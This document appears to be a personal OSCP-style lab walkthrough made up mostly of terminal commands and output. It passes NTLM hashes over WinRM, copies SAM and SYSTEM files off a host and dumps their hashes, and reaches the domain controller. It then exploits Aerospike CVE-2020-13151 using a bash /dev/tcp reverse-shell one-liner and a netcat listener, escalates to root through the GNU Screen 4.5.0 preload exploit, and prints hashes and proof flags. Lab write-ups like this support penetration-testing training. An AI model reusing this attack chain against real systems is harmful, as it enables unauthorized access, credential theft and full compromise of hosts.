+WINRM       10.10.190.140   5985   DC01             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.190.140   5985   DC01             [-] oscp.exam\tom.kinney:e728ecbadfb02f51ce8eed753f3ff3fd
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.190.140   5985   DC01             [-] oscp.exam\tom_admin:e728ecbadfb02f51ce8eed753f3ff3fd
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       
+
+Tried connecting with winrm for the user, login shows that the result is false positive for admin, because the user is not admin
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ proxychains -q evil-winrm -i 10.10.190.142 -u celia.almeda --hash 'e728ecbadfb02f51ce8eed753f3ff3fd'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> whoami
+oscp\celia.almeda
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> hostname
+MS02
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> 
+
+Did mannual enumeration on the target and found an old SAM and SYSTEM file in an old folder
+Evil-WinRM* PS C:\windows.old\windows\System32> ls
+
+
+    Directory: C:\windows.old\windows\System32
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         12/7/2019   1:14 AM                AppLocker
+d-----          4/4/2022   6:03 AM                Boot
+d---s-          4/4/2022   6:03 AM                Configuration
+d-----          4/4/2022   6:03 AM                DriverState
+d-----          4/4/2022   6:03 AM                DriverStore
+d-----          4/4/2022   6:04 AM                en-US
+d---s-          4/4/2022   6:06 AM                Microsoft
+-a----         12/7/2019   1:09 AM         113256 compmgmt.msc
+-a----         12/7/2019   1:09 AM           9571 ResPriHMImageList
+-a----         12/7/2019   1:09 AM           9196 ResPriHMImageListLowCost
+-a----         12/7/2019   1:09 AM           8977 ResPriImageList
+-a----         12/7/2019   1:09 AM           8690 ResPriImageListLowCost
+-a----          4/4/2022   6:00 AM          57344 SAM
+-a----          4/4/2022   6:00 AM       11636736 SYSTEM
+-a----         3/25/2022   1:34 PM         230400 WorkFoldersShell.dll
+-a----         3/25/2022   1:34 PM        2229576 workfolderssvc.dll
+-a----         3/25/2022   1:31 PM         283648 wosc.dll
+-a----
+
+evil-winrm have machanism to download and upload file from-to the local PC
+
+*Evil-WinRM* PS C:\windows.old\windows\System32> download SAM
+                                        
+Info: Downloading C:\windows.old\windows\System32\SAM to SAM
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\windows.old\windows\System32> download SYSTEM
+                                        
+Info: Downloading C:\windows.old\windows\System32\SYSTEM to SYSTEM
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\windows.old\windows\System32> 
+
+Found hashes for tom_admin
+──(kali㉿kali)-[~/oscpa]
+└─$ sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+[sudo] password for kali: 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
+tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
+Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
+David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
+Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
+[*] Cleaning up... 
+            
+Copied the hashes and added them to the one I have then run netexec on the internal machines again.
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ proxychains -q netexec winrm 10.10.190.140 10.10.190.142 -u username.txt --hash hashes.hash    
+WINRM       10.10.190.142   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
+WINRM       10.10.190.140   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.190.142   5985   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.190.140   5985   DC01             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+WINRM       10.10.190.140   5985   DC01             [-] oscp.exam\tom.kinney:4979d69d4ca66955c075c41cf45f24dc
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.190.140   5985   DC01             [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
+
+I found tom_admin have access to the domain controller, I connected to the domain contoller using WinRM
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ proxychains -q evil-winrm -i 10.10.190.140 -u tom_admin --hash 4979d69d4ca66955c075c41cf45f24dc
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\tom_admin\Documents> whoami
+oscp\tom_admin
+*Evil-WinRM* PS C:\Users\tom_admin\Documents> hostname
+DC01
+*Evil-WinRM* PS C:\Users\tom_admin\Documents> 
+
+
+STANDALONE
+
+#Started with .143 machine
+
+Nmap scan report for 192.168.230.143
+Host is up (0.053s latency).
+Not shown: 990 filtered tcp ports (no-response)
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
+|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
+|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
+80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Test Page for the Nginx HTTP Server on Fedora
+443/tcp  open  http       Apache httpd 2.4.41
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  ppp?
+3001/tcp open  nessus?
+3003/tcp open  cgms?
+3306/tcp open  mysql      MySQL (unauthorized)
+5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
+| ssl-cert: Subject: commonName=aero
+| Subject Alternative Name: DNS:aero
+| Not valid before: 2021-05-10T22:20:48
+|_Not valid after:  2031-05-08T22:20:48
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   SMBProgNeg: 
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
+|     Fpostmaster.c
+|     L2113
+|_    RProcessStartupPacket
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port3003-TCP:V=7.94SVN%I=7%D=11/24%Time=67434DA4%P=x86_64-pc-linux-gnu%
+SF:r(GenericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTS
+SF:PRequest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServe
+SF:rCookie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDStr
+SF:ing,1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5432-TCP:V=7.94SVN%I=7%D=11/24%Time=67434D9F%P=x86_64-pc-linux-gnu%
+SF:r(SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fro
+SF:ntend\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\
+SF:x203\.0\0Fpostmaster\.c\0L2113\0RProcessStartupPacket\0\0");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 4 hops
+Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+-   Hops 1-3 are the same as for 192.168.230.141
+4   55.25 ms 192.168.230.143
+
+Found that the website is vulnerable to aero
+ssl-cert: Subject: commonName=aero
+| Subject Alternative Name: DNS:aero
+
+┌──(kali㉿kali)-[~/oscpa]
+└─$ searchsploit aero                                      
+------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                            |  Path
+------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Aero CMS v0.0.1 - PHP Code Injection (auth)                                                                                               | php/webapps/51085.txt
+Aero CMS v0.0.1 - SQL Injection (no auth)                                                                                                 | php/webapps/51083.txt
+Aero CMS v0.0.1 - SQLi                                                                                                                    | php/webapps/51022.txt
+Aerohive HiveOS 5.1r5 < 6.1r5 - Multiple Vulnerabilities                                                                                  | php/webapps/34038.txt
+Aerohive HiveOS 5.1r5 < 6.1r5 - Remote Code Execution                                                                                     | hardware/webapps/42178.py
+Aerospike Database 5.1.0.3 - OS Command Execution                                                                                         | multiple/remote/49067.py
+Extreme Networks Aerohive HiveOS 11.0 - Remote Denial of Service (PoC)                                                                    | hardware/dos/48441.sh
+------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+Used 49067
+
+Modified the exploit, changed the version on the exploit to 5.1.0.3 so it will so it will capture our target since it is running a version below that
+The exploit also required us to install areospike packages with pip3 
+We installed python virtual environment on our kali
+Sudo apt intall virtualenv
+#we created a directory for it with the command
+──(kali㉿kali)-[~/oscpa]
+└─$ virtualenv oscpa
+created virtual environment CPython3.12.6.final.0-64 in 666ms
+  creator CPython3Posix(dest=/home/kali/oscpa/oscpa, clear=False, no_vcs_ignore=False, global=False)
+  seeder FromAppData(download=False, pip=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
+    added seed packages: pip==24.3.1
+  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/oscpa]
+└─$ source oscpa/bin/activate
+                                                                                                                                                                            
+┌──(oscpa)─(kali㉿kali)-[~/oscpa]
+└─$ pip3 install aerospike                                                                         
+Collecting aerospike
+  Using cached aerospike-15.1.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (5.4 kB)
+Using cached aerospike-15.1.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (5.4 MB)
+Installing collected packages: aerospike
+Successfully installed aerospike-15.1.0
+                                                                                                                                                                            
+┌──(oscpa)─(kali㉿kali)-[~/oscpa]
+└─$ 
+To run our target successfully, we also need the poc.lua file, which we downloaded from this github repository, we also chaged the permission to execution format.
+https://github.com/b4ny4n/CVE-2020-13151/blob/master/poc.lua
+
+We are ready to execute our command acompanied with a reverse shell, we used port 3000 because it is the default port for aero
+
+──(oscpa)─(kali㉿kali)-[~/oscpa]
+└─$ python3 49067.py --ahost 192.168.230.143 --aport 3000 --cmd "bash -c 'bash -i >& /dev/tcp/192.168.45.154/443 0>&1 &'"
+[+] aerospike build info: 5.1.0.1
+
+[+] looks vulnerable
+[+] populating dummy table.
+[+] writing to test.cve202013151
+[+] wrote wPqhLjykFZMIFccz
+[+] registering udf
+[+] issuing command "bash -c 'bash -i >& /dev/tcp/192.168.45.154/443 0>&1 &'"
+[-] UDF execution returned Client timeout: socket=30000 total=1000 iterations=1 lastNode=192.168.230.143:3000
+
+Caught the reverse shell in another window 
+┌──(kali㉿kali)-[~/oscpa]
+└─$ nc -nvlp 443 
+listening on [any] 443 ...
+connect to [192.168.45.154] from (UNKNOWN) [192.168.230.143] 57818
+bash: cannot set terminal process group (986): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+aero@oscp:/$ whoami
+whoami
+aero
+aero@oscp:/$ hostname
+hostname
+oscp
+aero@oscp:/$ 
+aero@oscp:/$ cd home
+cd home
+aero@oscp:/home$ cd aero
+cd aero
+aero@oscp:/home/aero$ ls
+ls
+local.txt
+snap
+aero@oscp:/home/aero$ cat local.txt
+cat local.txt
+e42194db65b72a403fcd3efdba87b222
+aero@oscp:/home/aero$ 
+
+Going for privilege escalation, I found an SUID program that is vilnerable.
+
+aero@oscp:/home/aero$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/screen-4.5.0
+/usr/bin/pkexec
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/chfn
+
+┌──(kali㉿kali)-[~]
+└─$ searchsploit screen 4.5.0                       
+--------------------------------------------------- ---------------------------------
+ Exploit Title                                     |  Path
+--------------------------------------------------- ---------------------------------
+GNU Screen 4.5.0 - Local Privilege Escalation      | linux/local/41154.sh
+GNU Screen 4.5.0 - Local Privilege Escalation (PoC | linux/local/41152.txt
+--------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                     
+┌──(kali㉿kali)-[~]
+└─$ 
+
+This websites helped me
+https://medium.com/r3d-buck3t/overwriting-preload-libraries-to-gain-root-linux-privesc-77c87b5f3bf8
+https://github.com/YasserREED/screen-v4.5.0-priv-escalate/blob/main/full-exploit.sh
+https://www.exploit-db.com/exploits/41154
+
+I need to copy the code to the target and execute but there are some .c libraries in the code that needed to be compiled during the execution and gcc was not found on the target.
+But I tested it and found gcc-9 on the system
+
+aero@oscp:/home/aero$ gcc
+gcc
+
+Command 'gcc' not found, but can be installed with:
+
+apt install gcc
+
+Please ask your administrator.
+aero@oscp:/home/aero$ gcc-
+gcc-
+
+Command 'gcc-' not found, did you mean:
+
+  command 'gcc' from deb gcc (4:9.3.0-1ubuntu2)
+  command 'gcc-8' from deb gcc-8 (8.4.0-3ubuntu2)
+  command 'gcc-9' from deb gcc-9 (9.4.0-1ubuntu1~20.04)
+  command 'gcc-7' from deb gcc-7 (7.5.0-6ubuntu2)
+
+Try: apt install <deb name>
+
+aero@oscp:/home/aero$ gcc-9
+gcc-9
+gcc-9: fatal error: no input files
+compilation terminated.
+aero@oscp:/home/aero$ 
+
+I modified the code to use gcc-9 and copied the exploit to the target using VI 
+changed it to executable
+aero@oscp:/home/aero$ chmod a+x exploit.sh
+chmod a+x exploit.sh
+
+#executed the command
+
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-aero.
+
+whoami
+root
+hostname
+oscp
+pwd
+/etc
+cd /root
+ls
+aerospike.sh
+proof.txt
+snap
+cat proof.txt
+6b379df004058c37d3a394d882c1e7f3
+
+
